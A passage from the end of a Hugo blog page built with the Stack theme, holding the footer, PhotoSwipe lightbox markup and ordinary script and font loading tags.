2022 ykikoqAq</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>